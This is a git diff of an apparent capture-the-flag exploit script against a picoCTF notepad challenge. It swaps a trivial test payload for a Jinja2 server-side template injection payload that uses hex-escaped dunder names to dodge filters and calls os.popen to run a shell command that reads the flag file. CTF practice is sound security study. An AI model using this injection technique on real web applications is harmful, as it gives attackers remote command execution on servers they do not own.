@@ -3,6 +3,7 @@ import urllib.parse as urp
 import html as HTML
 
 URL = "https://notepad.mars.picoctf.net"
+# URL = "http://localhost:8000"
 
 
 class Exploit:
@@ -31,6 +32,7 @@ class Exploit:
 
     def start(self):
         error_url = self.lfi_requests().url
+        print(error_url)
         error_url = urp.urlparse(error_url).path[18:-5]
 
         get_payload = self.get_payload_homepage(error=error_url)
@@ -40,7 +42,7 @@ class Exploit:
         return parse_payload
 
 
-payload = """{{app}}"""
+payload = """{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')['read']()}}"""
 x = Exploit(content=payload).start()
 
 print(x)
